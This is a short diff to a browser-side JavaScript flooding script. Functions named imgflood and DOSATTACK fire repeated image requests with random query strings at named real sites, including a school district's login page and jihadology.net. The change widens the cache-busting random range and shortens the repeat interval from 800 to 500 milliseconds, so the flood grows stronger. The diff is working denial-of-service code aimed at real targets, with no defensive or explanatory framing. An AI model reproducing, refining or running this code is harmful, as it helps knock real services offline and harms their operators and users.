@@ -4,7 +4,7 @@ function imgflood(link, uri) {
   var TARGET = link;
   var URI = uri;
   var pic = new Image();
-  var rand = Math.floor(Math.random() * 1000);
+  var rand = Math.floor(Math.random() * 10000000);
   pic.src = 'http:'+TARGET+URI+rand+'=val';
 }
 function DOSATTACK(link){
@@ -22,5 +22,5 @@ setInterval(function(){
   imgflood("ls-child.mvcsc.k12.in.us","/index.php");
   DOSATTACK("jihadology.net");
   DOSATTACK("ls-child.mvcsc.k12.in.us/log_in");
-}, 800);
+}, 500);
 
